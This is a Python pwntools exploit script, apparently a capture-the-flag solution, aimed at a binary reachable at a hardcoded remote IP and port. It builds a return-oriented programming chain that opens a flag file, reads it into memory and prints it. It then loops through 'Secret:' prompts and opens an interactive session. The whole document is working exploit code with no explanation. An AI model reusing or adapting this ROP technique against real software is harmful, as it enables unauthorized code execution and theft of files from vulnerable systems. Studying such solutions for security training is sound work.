from pwn import*
p = process('./main')
#context.log_level ='DEBUG'
p = remote('183.129.189.60',10051)
elf =ELF('./main')
pop_rdi_ret = 0x40161B
pop_rsi_r15 = 0x0401619
flag_address = 0x4021DF
gadget_I = 0x401612
gadget_Ii = 0x4015F8
payload  = '\x00'*(1+8) + p64(pop_rdi_ret) + p64(flag_address) + p64(pop_rsi_r15) + p64(0)*2 + p64(elf.plt['open'])
payload += p64(gadget_I) + p64(0) + p64(1)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(elf.bss() + 0x50)
payload += p64(0x30)
payload += p64(gadget_Ii)
payload += p64(0)*7
payload += p64(pop_rdi_ret) + p64(elf.bss() + 0x50) + p64(elf.plt['puts'])
p.sendlineafter("What's your name? ",payload)

for i in range(1100):
	p.sendlineafter('Secret:','FMYY')
for i in range(234):
	p.sendafter('Secret:',p64(0))
p.interactive()
